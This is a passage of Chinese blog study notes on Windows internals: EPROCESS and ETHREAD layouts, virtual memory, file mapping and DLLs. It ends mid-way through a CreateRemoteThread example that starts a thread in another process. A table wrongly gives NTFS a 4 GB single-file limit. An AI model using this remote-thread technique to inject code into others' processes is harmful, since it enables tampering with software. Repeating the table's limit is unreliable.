- 0x0 ]</span><br><span class="line">   +0x0c0 ProcessQuotaUsage : [2] 0</span><br><span class="line">   +0x0c8 ProcessQuotaPeak : [2] 0x8b601273</span><br><span class="line">   +0x0d0 CommitCharge     : 0</span><br><span class="line">   +0x0d4 QuotaBlock       : (null) </span><br><span class="line">   +0x0d8 CpuQuotaBlock    : (null) </span><br><span class="line">   +0x0dc PeakVirtualSize  : 0</span><br><span class="line">   +0x0e0 VirtualSize      : 0x865f82e0</span><br><span class="line">   +0x0e4 SessionProcessLinks : _LIST_ENTRY [ 0x0 - 0x3 ]</span><br><span class="line">   +0x0ec DebugPort        : 0x00000040 Void</span><br><span class="line">   +0x0f0 ExceptionPortData : (null) </span><br><span class="line">   +0x0f0 ExceptionPortValue : 0</span><br><span class="line">   +0x0f0 ExceptionPortState : 0y000</span><br><span class="line">   +0x0f4 ObjectTable      : (null) </span><br><span class="line">   +0x0f8 Token            : _EX_FAST_REF</span><br><span class="line">   +0x0fc WorkingSetPage   : 0</span><br><span class="line">   +0x100 AddressCreationLock : _EX_PUSH_LOCK</span><br><span class="line">   +0x104 RotateInProgress : (null) </span><br><span class="line">   +0x108 ForkInProgress   : (null) </span><br><span class="line">   +0x10c HardwareTrigger  : 0</span><br><span class="line">   +0x110 PhysicalVadRoot  : (null) </span><br><span class="line">   +0x114 CloneRoot        : (null) </span><br><span class="line">   +0x118 NumberOfPrivatePages : 0</span><br><span class="line">   +0x11c NumberOfLockedPages : 0</span><br><span class="line">   +0x120 Win32Process     : 0x8b6088d8 Void</span><br><span class="line">   +0x124 Job              : (null) </span><br><span class="line">   +0x128 SectionObject    : 0x7ffe0000 Void</span><br><span class="line">   +0x12c SectionBaseAddress : (null) </span><br><span class="line">   +0x130 Cookie           : 0</span><br><span class="line">   +0x134 Spare8           : 0</span><br><span class="line">   +0x138 WorkingSetWatch  : (null) </span><br><span class="line">   +0x13c Win32WindowStation : 0x74737953 Void</span><br><span class="line">   +0x140 InheritedFromUniqueProcessId : 0x00006d65 Void</span><br><span class="line">   +0x144 LdtInformation   : (null) </span><br><span class="line">   +0x148 VdmObjects       : 0x02000000 Void</span><br><span class="line">   +0x14c ConsoleHostProcess : 0</span><br><span class="line">   +0x150 DeviceMap        : (null) </span><br><span class="line">   +0x154 EtwDataSource    : (null) </span><br><span class="line">   +0x158 FreeTebHint      : 0x865cd838 Void</span><br><span class="line">   +0x160 PageDirectoryPte : _HARDWARE_PTE_X86</span><br><span class="line">   +0x160 Filler           : 0x83f80fc0`00000000</span><br><span class="line">   +0x168 Session          : 0x0000005c Void</span><br><span class="line">   +0x16c ImageFileName    : [15]  &quot;&quot;</span><br><span class="line">   +0x17b PriorityClass    : 0 &apos;&apos;</span><br><span class="line">   +0x17c JobLinks         : _LIST_ENTRY [ 0x8709d522 - 0x9c ]</span><br><span class="line">   +0x184 LockedPagesList  : (null) </span><br><span class="line">   +0x188 ThreadListHead   : _LIST_ENTRY [ 0x6c - 0x0 ]</span><br><span class="line">   +0x190 SecurityPort     : 0x00000dfd Void</span><br><span class="line">   +0x194 PaeTop           : (null) </span><br><span class="line">   +0x198 ActiveThreads    : 0x18325b0</span><br><span class="line">   +0x19c ImagePathHash    : 0</span><br><span class="line">   +0x1a0 DefaultHardErrorProcessing : 0x38ed48</span><br><span class="line">   +0x1a4 LastThreadExitStatus : 0n0</span><br><span class="line">   +0x1a8 Peb              : 0x00036201 _PEB</span><br><span class="line">   +0x1ac PrefetchTrace    : _EX_FAST_REF</span><br><span class="line">   +0x1b0 ReadOperationCount : _LARGE_INTEGER 0x0000002f`00000000</span><br><span class="line">   +0x1b8 WriteOperationCount : _LARGE_INTEGER 0x8b601070`00000000</span><br><span class="line">   +0x1c0 OtherOperationCount : _LARGE_INTEGER 0x0</span><br><span class="line">   +0x1c8 ReadTransferCount : _LARGE_INTEGER 0x87ae5f3c`00000000</span><br><span class="line">   +0x1d0 WriteTransferCount : _LARGE_INTEGER 0x87b1ff3c</span><br><span class="line">   +0x1d8 OtherTransferCount : _LARGE_INTEGER 0x0</span><br><span class="line">   +0x1e0 CommitChargeLimit : 0</span><br><span class="line">   +0x1e4 CommitChargePeak : 0</span><br><span class="line">   +0x1e8 AweInfo          : (null) </span><br><span class="line">   +0x1ec SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO</span><br><span class="line">   +0x1f0 Vm               : _MMSUPPORT</span><br><span class="line">   +0x25c MmProcessLinks   : _LIST_ENTRY [ 0x904 - 0x86fa4ce8 ]</span><br><span class="line">   +0x264 HighestUserAddress : (null) </span><br><span class="line">   +0x268 ModifiedPageCount : 0</span><br><span class="line">   +0x26c Flags2           : 0x9a84f1f4</span><br><span class="line">   +0x26c JobNotReallyActive : 0y0</span><br><span class="line">   +0x26c AccountingFolded : 0y0</span><br><span class="line">   +0x26c NewProcessReported : 0y1</span><br><span class="line">   +0x26c ExitProcessReported : 0y0</span><br><span class="line">   +0x26c ReportCommitChanges : 0y1</span><br></pre></td></tr></table></figure><p>上面这个与进程隐藏有关。  </p><h1 id="线程结构体ETHREAD"><a href="#线程结构体ETHREAD" class="headerlink" title="线程结构体ETHREAD"></a>线程结构体ETHREAD</h1><p>每个windows线程在0环都有一个对应的结构体：ETHREAD  这个结构体包含了线程所有重要的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _ETHREAD</span><br><span class="line">ntdll!_ETHREAD</span><br><span class="line">   +0x000 Tcb              : _KTHREAD</span><br><span class="line">   +0x200 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x208 ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +0x208 KeyedWaitChain   : _LIST_ENTRY</span><br><span class="line">   +0x210 ExitStatus       : Int4B</span><br><span class="line">   +0x214 PostBlockList    : _LIST_ENTRY</span><br><span class="line">   +0x214 ForwardLinkShadow : Ptr32 Void</span><br><span class="line">   +0x218 StartAddress     : Ptr32 Void</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x010 CycleTime        : Uint8B</span><br><span class="line">   +0x018 HighCycleTime    : Uint4B</span><br><span class="line">   +0x020 QuantumTarget    : Uint8B</span><br><span class="line">   +0x028 InitialStack     : Ptr32 Void</span><br><span class="line">   +0x02c StackLimit       : Ptr32 Void</span><br><span class="line">   +0x030 KernelStack      : Ptr32 Void</span><br><span class="line">   +0x034 ThreadLock       : Uint4B</span><br><span class="line">   +0x038 WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   +0x039 Running          : UChar</span><br><span class="line">   +0x03a Alerted          : [2] UChar</span><br><span class="line">   +0x03c KernelStackResident : Pos 0, 1 Bit</span><br><span class="line">   +0x03c ReadyTransition  : Pos 1, 1 Bit</span><br><span class="line">   +0x03c ProcessReadyQueue : Pos 2, 1 Bit</span><br><span class="line">   +0x03c WaitNext         : Pos 3, 1 Bit</span><br><span class="line">   +0x03c SystemAffinityActive : Pos 4, 1 Bit</span><br><span class="line">   +0x03c Alertable        : Pos 5, 1 Bit</span><br></pre></td></tr></table></figure><h2 id="KTHREAD主要成员介绍"><a href="#KTHREAD主要成员介绍" class="headerlink" title="KTHREAD主要成员介绍"></a>KTHREAD主要成员介绍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">1)+0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line"></span><br><span class="line">       以这个开头的结构体，都可说是“可等待”对象，比如Mutex互斥体、Event事件等（WaitForSingleObject）</span><br><span class="line"></span><br><span class="line">2)+0x018 InitialStack     : Ptr32 Void</span><br><span class="line">   +0x01c StackLimit       : Ptr32 Void</span><br><span class="line">        +0x028 KernelStack      : Ptr32 Void</span><br><span class="line"></span><br><span class="line">线程切换相关，，每个线程都有个0环的堆栈和0环的TSS。</span><br><span class="line"></span><br><span class="line">3)+0x020 Teb              : Ptr32 Void</span><br><span class="line"></span><br><span class="line">TEB，Thread Environment Block，线程环境块。</span><br><span class="line">大小4KB,位于用户地址空间。</span><br><span class="line">FS:[0] -&gt; TEB(3环时  0环时FS执行KPCR)</span><br><span class="line"></span><br><span class="line">4)+0x02c DebugActive      : UChar</span><br><span class="line"></span><br><span class="line">       如果值为-1 不能使用调试寄存器：Dr0 - Dr7</span><br><span class="line"></span><br><span class="line">5)+0x034 ApcState         : _KAPC_STATE</span><br><span class="line">   +0x0e8 ApcQueueLock     : Uint4B</span><br><span class="line">        +0x138 ApcStatePointer  : [2] Ptr32 _KAPC_STATE</span><br><span class="line">+0x14c SavedApcState    : _KAPC_STATE</span><br><span class="line"></span><br><span class="line">APC相关 </span><br><span class="line"></span><br><span class="line">6)+0x02d State            : UChar</span><br><span class="line"></span><br><span class="line">线程状态：就绪、等待还是运行</span><br><span class="line"></span><br><span class="line">7)+0x06c BasePriority     : Char</span><br><span class="line"></span><br><span class="line">其初始值是所属进程的BasePriority值(KPROCESS-&gt;BasePriority)，以后可以通过KeSetBasePriorityThread()函数重新设定</span><br><span class="line"></span><br><span class="line">8)+0x070 WaitBlock        : [4] _KWAIT_BLOCK</span><br><span class="line"></span><br><span class="line">       等待哪个对象（WaitForSingleObject）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9)+0x0e0 ServiceTable     : Ptr32 Void</span><br><span class="line"></span><br><span class="line">指向系统服务表基址</span><br><span class="line"></span><br><span class="line">10)+0x134 TrapFrame</span><br><span class="line"></span><br><span class="line">进0环时保存环境（3换的寄存器之类的）</span><br><span class="line"></span><br><span class="line">11)+0x140 PreviousMode     : Char</span><br><span class="line"></span><br><span class="line">       某些内核函数会判断程序是0环调用还是3环调用的</span><br><span class="line"></span><br><span class="line">12)+0x1b0 ThreadListEntry  : _LIST_ENTRY</span><br><span class="line"></span><br><span class="line">双向链表 一个进程所有的线程 都挂在一个链表中 挂的就是这个位置</span><br><span class="line"></span><br><span class="line">一共有两个这样的链表</span><br></pre></td></tr></table></figure><h2 id="ETHREAD其他成员介绍"><a href="#ETHREAD其他成员介绍" class="headerlink" title="ETHREAD其他成员介绍"></a>ETHREAD其他成员介绍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1)+0x1ec Cid              : _CLIENT_ID</span><br><span class="line"></span><br><span class="line">进程ID、线程ID</span><br><span class="line"></span><br><span class="line">2)+0x220 ThreadsProcess   : Ptr32 _EPROCESS</span><br><span class="line"></span><br><span class="line">       指向自己所属进程</span><br><span class="line"></span><br><span class="line">3)+0x22c ThreadListEntry  : _LIST_ENTRY</span><br><span class="line"></span><br><span class="line">双向链表 一个进程所有的线程 都挂在一个链表中 挂的就是这个位置</span><br><span class="line"></span><br><span class="line">一共有两个这样的链表</span><br></pre></td></tr></table></figure><p>这个是两个链圈，一个是在KTHREAD里一个是ETHREAD。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/1.png" alt="1"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] 潘爱民老师《Windows内核原理与实现》 中的第3章<br>[2] 滴水视频  </p>]]></content>
      
      <categories>
          
          <category> 笔记 - 进程与线程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程结构体 </tag>
            
            <tag> 线程结构体 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WIN32编程视频的相关笔记二</title>
      <link href="/2018/07/05/WIN32%E7%BC%96%E7%A8%8B%E8%A7%86%E9%A2%91%E7%9A%84%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
      <url>/2018/07/05/WIN32%E7%BC%96%E7%A8%8B%E8%A7%86%E9%A2%91%E7%9A%84%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0%E4%BA%8C/</url>
      <content type="html"><![CDATA[<h1 id="虚拟内存与物理内存"><a href="#虚拟内存与物理内存" class="headerlink" title="虚拟内存与物理内存"></a>虚拟内存与物理内存</h1><h2 id="1-虚拟内存与物理内存关系"><a href="#1-虚拟内存与物理内存关系" class="headerlink" title="1. 虚拟内存与物理内存关系"></a>1. 虚拟内存与物理内存关系</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/9.png" alt="1"><br>可以使用的内存不一定有物理页，必须申请内存了才有物理页。  </p><p>物理页数量限制由内存条限制</p><p>物理内存<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/10.png" alt="10"></p><p>pagefile.sys,就是用硬盘存放物理页。  </p><h1 id="私有内存的申请与释放"><a href="#私有内存的申请与释放" class="headerlink" title="私有内存的申请与释放"></a>私有内存的申请与释放</h1><p>windbg里!vad 地址，可以查看那些线性地址被占用。<br>线性地址分为Private和Mapped</p><p>私有内存时当前物理页只归当前进程用，一个物理页被多个进程共享称为Mapped</p><h2 id="申请内存的两种方式"><a href="#申请内存的两种方式" class="headerlink" title="申请内存的两种方式"></a>申请内存的两种方式</h2><ol><li>通过VirtualAlloc/VirtualAllocEx申请的：Private Memory（第一个是自己进程，第二个可以指定ID，远程申请）   </li><li>通过CreateFileMapping映射的： Mapped Memory</li></ol><h2 id="内存申请与释放："><a href="#内存申请与释放：" class="headerlink" title="内存申请与释放："></a>内存申请与释放：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAlloc(</span><br><span class="line">  LPVOID lpAddress,//要分配的内存区域地址，通常不用指定</span><br><span class="line">  DWORD dwSize,//分配的大小，单位自己，但一般申请页的整数倍</span><br><span class="line">  DWORD flAllocationType,//分配的类型，常用的是MEM_COMMIT（需要物理内存）和MEM_RESERVE（留出来，并不需要物理内存）</span><br><span class="line">  DWORD flProtect//改内存的初始保护属性，就是读写执行权限</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI VirtualFree(</span><br><span class="line">  _In_  LPVOID lpAddress,//要释放的内存区域地址，通常不用指定</span><br><span class="line">  _In_  SIZE_T dwSize,//内存大小，必须填0</span><br><span class="line">  _In_  DWORD dwFreeType//MEM_DECOMMIT是虚拟地址保存，不留物理页，MEM_RELEASE都不保留</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>malloc是从已经申请的现有的内存，挖出来一块（堆内存），这个内存已经由VirtualAlloc申请好了。<br>malloc–&gt;HeapAlloc</p><h2 id="共享内存的申请与释放"><a href="#共享内存的申请与释放" class="headerlink" title="共享内存的申请与释放"></a>共享内存的申请与释放</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个内核对象，可以为我们准备物理内存</span></span><br><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateFileMapping</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      HANDLE hFile,<span class="comment">//如果指定文件，不仅可以提供物理内存，还能将次文件关联到这个物理内存，（INVALID_HANDLE_VALUE）-1就是不关联</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_  LPSECURITY_ATTRIBUTES lpAttributes,<span class="comment">//安全描述符，NULL就行</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      DWORD flProtect,<span class="comment">//保护模式，PAGE_READONLY为只读，PAGE_READWRITE为读写</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      DWORD dwMaximumSizeHigh,<span class="comment">//高32位，0就行</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      DWORD dwMaximumSizeLow,<span class="comment">//申请多大一块物理内存</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_  LPCTSTR lpName<span class="comment">//内核对象的名字</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">//返回内核句柄，如果已经创立过了，GetLastError会返回错误，但是返回值本身还是那个内核对象句柄。   </span></span><br><span class="line"><span class="comment">//这个函数完了只是物理页准备好了，还没用跟虚拟内存建立联系，所以将物理页与线性地址进行映射</span></span><br><span class="line">所以还要用到下一个API</span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  HANDLE hFileMappingObject,<span class="comment">//映射FIleMap的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  DWORD dwDesiredAccess,<span class="comment">//虚拟内存属性，属性要比物理页属性权限低，更严格</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  DWORD dwFileOffsetHigh,<span class="comment">//NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  DWORD dwFileOffsetLow,<span class="comment">//从哪里开始映射</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  SIZE_T dwNumberOfBytesToMap<span class="comment">//物理页创建多少就映射多少</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line">返回值就是映射好的虚拟地址句柄   </span><br><span class="line">可以映射多个内存   </span><br><span class="line"></span><br><span class="line">用完之后要关闭映射，用到UnmapViewOfFile（映射的虚拟地址句柄）   </span><br><span class="line"><span class="function">BOOL <span class="title">UnmapViewOfFile</span><span class="params">( </span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBaseAddress </span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄</span></span><br><span class="line">CloseHandle（物理页的内核对象句柄）</span><br><span class="line">Map的使用的时候回挂上物理页</span><br><span class="line"></span><br><span class="line">同一个物理页在<span class="number">2</span>个进程映射出的虚拟内存地址可能不一样</span><br></pre></td></tr></table></figure><h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><p>文件系统是操作系统用于管理磁盘上文件的方法和数据结构，简单点说就是在磁盘上如何组织文件的方法。  </p><table><thead><tr><th>表格</th><th>NTFS</th><th>FAT32</th></tr></thead><tbody><tr><td>磁盘分区容量</td><td>2T（2048G）</td><td>32G</td></tr><tr><td>单个文件容量</td><td>4G</td><td>最大4G</td></tr><tr><td>EFS加密</td><td>支持</td><td>不支持</td></tr><tr><td>磁盘配额</td><td>支持</td><td>不支持</td></tr></tbody></table><h1 id="内存映射文件"><a href="#内存映射文件" class="headerlink" title="内存映射文件"></a>内存映射文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">文件--&gt;物理内存</span><br><span class="line">物理内存--&gt;文件</span><br><span class="line">物理内存--&gt;进程的虚拟地址</span><br><span class="line">进程的虚拟地址--&gt;物理内存</span><br></pre></td></tr></table></figure><p>直接就能在虚拟内存上读写文件</p><p>跟共享内存差不多，多了一步，创建文件句柄<br>CreateFile，然后就是CreateFileMapping(第一个参数就不能为空了，是文件的句柄)，然后就是映射到虚拟内存，MapViewOfFIle（CreateFileMapping的句柄），这个函数返回值是句柄，句柄就是虚拟内存的地址<br>逻辑就是如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/12.png" alt="12"></p><p>比如说所有的DLL在物理页上都是只有一个空间的，映射到各个进程。那怎么是修改了一个进程的物理内存，不影响其他的进程呢就用到了写拷贝。      </p><h1 id="写拷贝"><a href="#写拷贝" class="headerlink" title="写拷贝"></a>写拷贝</h1><p>就是MapViewOfFile的参数dwDesiredAccess是FILE_MAP_COPY A copy-on-write view of the file is mapped. 就是当写的时候赋值。<br>当资源释放写会文件还是原来的dll。<br> <img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/13.png" alt="13"></p><h1 id="静态链接库"><a href="#静态链接库" class="headerlink" title="静态链接库"></a>静态链接库</h1><p> 生成的头文件和lib都有可能要给别人用。  </p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/14.png" alt="14"></p><h2 id="静态库的缺点"><a href="#静态库的缺点" class="headerlink" title="静态库的缺点"></a>静态库的缺点</h2><ol><li>使用的静态链接生成的可执行文件体积较大。  </li><li>包含相同的公共代码，造成浪费。 </li></ol><h1 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h1><p>动态库就是dll，ocx，解决掉了静态库的问题。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/15.png" alt="15"></p><h2 id="使用格式"><a href="#使用格式" class="headerlink" title="使用格式"></a>使用格式</h2><p>在声明时候<br>extern “C” _declspec(dllexport) 调用约定 返回值 函数名 (参数列表) 下面是示例：<br>extern “C” _declspec(dllexport) int fun(int a, int b);</p><p>或者要制定函数名，就建一个.def文件<br>fun @编号 noname 比如 fun@1</p><p>使用方法：</p><ol><li>先定义函数指针<br>typedef 返回值类型 (调用约定 <em>函数指针名)(参数列表)<br>示例 typedef int(__stdcall </em>fun)(int, int);</li><li>声明函数指针变量示例fun a</li><li>加载模块（LoadLibraryA（dll名字））</li><li>给指针变量赋值   </li><li>使用</li><li>FreeLibrary</li></ol><h1 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h1><p>不仅要dll，还要拷贝lib<br>然后还要加一句  </p><p>#pragma comment(lib,”A.lib”)到调用文件中<br>然后加入函数申明,比如<br>extern “C”_declspec(dllimport) int Min(int a,int b);   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hinstDLL,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwReason,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpvReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>Main和WinMain的区别： </p><ol><li><p>WinMain可能被调用很多次。<br>DLL_PROCESS_ATTACH   （LoadLibrary）调用一次<br>DLL_PROCESS_DETACH    (FreeLibrary) 调用一次<br>DLL_THREAD_ATTACH     每个进程的每多一个线程调用一次<br>DLL_THREAD_DETACH   每个进程的每多一个线程离开一次    </p></li><li><p>参数不一样，第一个参数当前dll被加载到什么位置，第二个参数被调用的原因。  </p></li></ol><h1 id="远程线程"><a href="#远程线程" class="headerlink" title="远程线程"></a>远程线程</h1><ol><li>线程就是进程的执行实体 </li><li>代码必须通过线程才能执行  </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE WINAPI CreateRemoteThread(</span><br><span class="line">  _In_   HANDLE hProcess,//进程句柄</span><br><span class="line">  _In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,//SD</span><br><span class="line">  _In_   SIZE_T dwStackSize,</span><br><span class="line">  _In_   LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">  _In_   LPVOID lpParameter,</span><br><span class="line">  _In_   DWORD dwCreationFlags,</span><br><span class="line">  _Out_  LPDWORD lpThreadId</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>下面是代码示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">MyCreateRemoteThread</span><span class="params">(DWORD dwProcessID, DWORD dwProcAddr)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess;</span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadID;</span><br><span class="line">hProcess = <span class="number">0</span>;</span><br><span class="line">dwThreadID = <span class="number">0</span>;</span><br><span class="line">hThread = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1.获取进程句柄</span></span><br><span class="line">hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"OpenProcess Error!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.创建远程线程</span></span><br><span class="line">hThread=CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwProcAddr, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hThread) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"CreateRemoteThread Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3.关闭</span></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 